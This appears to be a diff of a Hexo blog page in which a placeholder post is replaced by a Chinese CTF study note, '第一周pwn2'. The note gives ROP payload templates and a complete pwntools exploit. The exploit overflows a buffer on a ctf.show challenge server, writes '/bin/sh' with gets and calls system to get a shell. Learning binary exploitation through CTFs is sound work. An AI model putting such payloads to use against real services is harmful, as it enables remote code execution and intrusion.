@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>第一个博客 | Hexo</title>
+  <title>第一周pwn2 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="简介：你好世界。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="第一个博客">
-<meta property="og:url" content="http://example.com/tags/index.html">
+  <meta name="description" content="1，payload &#x3D; b’a’*(0xA+8) + p64(pop_rdi) + p64(bin_sh)  + p64(ret) + p64(system)2，无binsh时sh也可代替3，有system无binsh时可以选择写入binsh，用gdb调试来查看可读可写的参数。来利用写入函数来改写参数的值，即payload &#x3D; b’a’*offset + p32(gets_ad">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第一周pwn2">
+<meta property="og:url" content="http://example.com/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="简介：你好世界。">
+<meta property="og:description" content="1，payload &#x3D; b’a’*(0xA+8) + p64(pop_rdi) + p64(bin_sh)  + p64(ret) + p64(system)2，无binsh时sh也可代替3，有system无binsh时可以选择写入binsh，用gdb调试来查看可读可写的参数。来利用写入函数来改写参数的值，即payload &#x3D; b’a’*offset + p32(gets_ad">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-01-14T10:15:59.000Z">
-<meta property="article:modified_time" content="2025-01-14T10:25:52.629Z">
+<meta property="article:published_time" content="2025-01-19T13:03:01.000Z">
+<meta property="article:modified_time" content="2025-01-19T13:04:09.077Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -71,10 +71,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="page-" class="h-entry article article-type-page" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-第一周pwn2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/tags/index.html" class="article-date">
-  <time class="dt-published" datetime="2025-01-14T10:15:59.000Z" itemprop="datePublished">2025-01-14</time>
+    <a href="/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn2/" class="article-date">
+  <time class="dt-published" datetime="2025-01-19T13:03:01.000Z" itemprop="datePublished">2025-01-19</time>
 </a>
     
   </div>
@@ -85,7 +85,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      第一个博客
+      第一周pwn2
     </h1>
   
 
@@ -93,12 +93,19 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>简介：<br>你好世界。</p>
+        <p>1，payload &#x3D; b’a’*(0xA+8) + p64(pop_rdi) + p64(bin_sh)  + p64(ret) + p64(system)<br>2，无binsh时sh也可代替<br>3，有system无binsh时可以选择写入binsh，用gdb调试来查看可读可写的参数。来利用写入函数来改写参数的值，即<br>payload &#x3D; b’a’*offset + p32(gets_addr) + p32(system_addr) + p32(buf2_addr) + p32(buf2_addr)<br>p.sendline(payload)<br>p.sendline(“&#x2F;bin&#x2F;sh”)<br>4，这是64位完整的exp<br>from pwn import *</p>
+<p>padding &#x3D; 0xA + 8</p>
+<p>io &#x3D; remote(“pwn.challenge.ctf.show”,28294)</p>
+<p>system &#x3D; 0x400520</p>
+<p>gets &#x3D; 0x400530</p>
+<p>binsh &#x3D; 0x603000 - 16</p>
+<p>rdi &#x3D; 0x4007f3<br>ret &#x3D; 0x4004fe<br>payload &#x3D; b’a’*padding<br>payload +&#x3D; p64(rdi)<br>payload +&#x3D; p64(binsh)<br>payload +&#x3D; p64(ret)<br>payload +&#x3D; p64(gets)<br>payload +&#x3D; p64(rdi)<br>payload +&#x3D; p64(binsh)<br>payload +&#x3D; p64(ret)<br>payload +&#x3D; p64(system)<br>io.recv()<br>io.sendline(payload)<br>io.sendline(“&#x2F;bin&#x2F;sh”)</p>
+<p>io.interactive()<br>照着这个格式来写就行。中间的binsh的位置要要用gdb来找，然后输入vmmap找本地的可读可写的参数就行了再减16.</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/tags/index.html" data-id="cm63mqzzo0000ok4k8yfk31ac" data-title="第一个博客" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn2/" data-id="cm63mr0060004ok4ke3mqdf85" data-title="第一周pwn2" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -106,6 +113,16 @@
   </div>
   
     
+<nav id="article-nav">
+  
+  
+    <a href="/2025/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8pwn1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">第一周pwn1</div>
+    </a>
+  
+</nav>
+
   
 </article>
 
